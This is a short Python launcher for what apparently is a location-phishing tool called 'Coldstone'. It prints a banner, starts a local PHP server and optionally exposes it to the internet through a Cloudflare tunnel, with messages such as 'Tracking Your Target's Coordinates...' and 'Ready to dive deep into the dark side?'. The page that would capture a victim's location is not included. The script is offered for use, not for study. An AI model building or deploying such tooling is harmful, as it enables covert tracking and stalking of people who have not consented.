import subprocess
import time
from pystyle import Colors, Colorate, Center

def show_cmd_ui():
    banner = r"""
  _______         _   _  _______    __          __ _____ __   __
 |__   __| /\    | \ | ||__   __| /\\ \        / /|_   _|\ \ / /
    | |   /  \   |  \| |   | |   /  \\ \  /\  / /   | |   \ V / 
    | |  / /\ \  | . ` |   | |  / /\ \\ \/  \/ /    | |    > <  
    | | / ____ \ | |\  |   | | / ____ \\  /\  /    _| |_  / . \ 
    |_|/_/    \_\|_| \_|   |_|/_/    \_\\/  \/    |_____|/_/ \_\
                                                                
    
                        C O L D S T O N E
    """
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(banner)))
    print(Colors.green + "[+] Welcome to Location Finder Tool")
    print(Colors.yellow + "[*] Fetching Data...")
    time.sleep(1)
    print(Colors.cyan + "[^] Process Complete!")
    print(Colors.red + "=" * 40)

def local_server():
    print("Local Server is Started ....")
    subprocess.Popen(["php","-S","127.0.0.1:8080"], stdout=subprocess.DEVNULL)
    time.sleep(2)
    if True:
        print(Colors.yellow + "[*] Tracking Your Target's Coordinates...")

def cf_server():
    print("Local Server is Started ....")
    subprocess.Popen(["php","-S","127.0.0.1:8080"], stdout=subprocess.DEVNULL)
    time.sleep(2)
    print("CloudFlare Tunnel is Started ....")
    subprocess.Popen(["cf.exe","tunnel","-url","127.0.0.1:8080"], stdout=subprocess.DEVNULL)
    time.sleep(10)
    if True:
        print(Colors.yellow + "[*] Tracking Your Target's Coordinates...")

def starts():
    print("Ready to dive deep into the dark side?")
    choice = input("Use Cloudflare Tunnel? (Y/N) [Default : Y] :").strip().lower()
    if choice in ["n", "no"]:
        local_server()
    else:
        cf_server()
if __name__ == "__main__":
    show_cmd_ui()
    starts()
    while True:
        time.sleep(1)